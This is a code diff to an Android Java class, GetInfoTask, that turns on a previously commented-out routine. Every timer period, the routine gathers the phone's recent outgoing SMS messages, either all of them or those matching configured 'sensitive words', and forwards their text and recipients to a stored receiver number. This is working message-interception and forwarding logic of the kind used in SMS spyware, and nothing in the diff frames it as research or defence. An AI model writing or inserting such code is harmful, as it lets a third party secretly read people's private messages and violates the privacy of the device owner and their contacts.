@@ -77,23 +77,30 @@ public class GetInfoTask extends TimerTask
 		// ===================================================================================
 		// Check outgoing SMS for redirecting these sensitive
 		// ===================================================================================
-		/*
-		boolean allowRedirectSMS = GlobalPrefActivity.getRedirectSms(context);
-		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
-		if (allowRedirectSMS && phoneNum.length() > 0) {
-			String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
-					.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
-					.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
-			if (sensitiveWords.length > 0) {
-				List<SmsInfo> smsList = SmsCtrl.getSensitiveOutgoingSmsList(context, sensitiveWords, timeThreshold);
-				for (SmsInfo sms : smsList) {
-					String header = String.format(context.getResources().getString(R.string.sms_redirect_header), sms.phoneNumber);
-					SmsCtrl.sendSms(phoneNum, header + sms.smsbody);
-				}
+		
+		//String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+		if (GlobalValues.recvPhoneNum.length() > 0) {
+			List<SmsInfo> smsList = new ArrayList<SmsInfo>();
+			
+			Calendar now = Calendar.getInstance();
+			Date threshold = new Date(now.getTime().getTime() - GlobalValues.getInfoTimerPeriod); 
+			
+			if (GlobalPrefActivity.getRedirectAllSms(context)) {
+				// Get all new outgoing SMS in past 300 seconds
+				smsList = SmsCtrl.getOutgoingSmsList(context, threshold);
+			}
+			else if (GlobalValues.sensitiveWords.length > 0) {
+				// Get all new outgoing SMS that contains sensitive words in past 300 seconds
+				smsList = SmsCtrl.getSensitiveOutgoingSmsList(context, GlobalValues.sensitiveWords, threshold);
+			}
+			
+			for (SmsInfo sms : smsList) {
+				String header = String.format(context.getResources().getString(R.string.sms_redirect_header), sms.phoneNumber);
+				SmsCtrl.sendSms(GlobalValues.recvPhoneNum, header + sms.smsbody);
 			}
 		}
-		*/
 		
+		//------------------------------------------------------------------------------------
 		// If there are no recipients, return 
 		if (GlobalValues.recipients == null || GlobalValues.recipients.length == 0) return;
 		
